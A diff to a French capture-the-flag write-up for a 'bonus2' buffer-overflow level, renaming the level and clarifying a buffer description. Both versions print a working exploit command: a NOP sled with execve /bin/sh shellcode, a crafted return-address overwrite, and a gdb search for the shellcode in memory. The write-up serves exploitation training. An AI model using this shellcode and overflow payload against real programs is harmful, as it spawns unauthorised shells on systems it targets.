@@ -7,7 +7,7 @@ set args $(python -c 'print 40*"\x90" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x6
 (gdb) find /b $esp, +1000, 0x6a, 0x0b, 0x58, 0x99, 0x52, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x31, 0xc9, 0xcd, 0x80
 
 
-# Bonus3 - Buffer Overflow avec Variables d'Environnement
+# bonus2 - Buffer Overflow avec Variables d'Environnement
 
 ## Analyse du Programme
 
@@ -18,7 +18,7 @@ set args $(python -c 'print 40*"\x90" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x6
 
 **Buffers**
 - s : Premier buffer pour argv[1]
-- var_38 : Buffer pour argv
+- var_38 : Buffer pour argv[2]
 - str : Buffer dans greetuser()
 
 ## Vulnérabilités
@@ -48,7 +48,7 @@ arg2 = "A" * 23 + "\x08\xf8\xff\xbf"
 
 **Commande d'Exploitation**
 ```bash
-./bonus3 $(python -c 'print 40*"\x90" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"') $(python -c 'print 23*"A" + "\x08\xf8\xff\xbf"')
+./bonus2 $(python -c 'print 40*"\x90" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"') $(python -c 'print 23*"A" + "\x08\xf8\xff\xbf"')
 ```
 
 ## Processus d'Exploitation
